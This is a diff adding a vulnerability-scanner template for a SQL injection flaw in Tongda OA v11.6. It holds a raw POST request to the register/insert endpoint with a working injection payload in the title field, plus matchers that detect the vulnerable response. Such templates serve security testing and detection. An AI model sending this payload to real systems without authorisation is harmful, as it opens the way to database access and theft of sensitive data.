@@ -1,0 +1,33 @@
+id: tongdaOA-v11_6-insert-sql-injection
+
+info:
+  name: 通达OA v11.6 insert SQL注入漏洞
+  author: cnaq
+  severity: high  
+  description: 通达OA v11.6 insert参数包含SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息
+  reference: http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: tongdaOA,sql,injection
+
+requests:
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/insert HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+
+      - type: word
+        part: header
+        words:
+          - 'Moved Temporarily'
+
+      - type: dsl
+        dsl:
+          - 'len(body)==0'
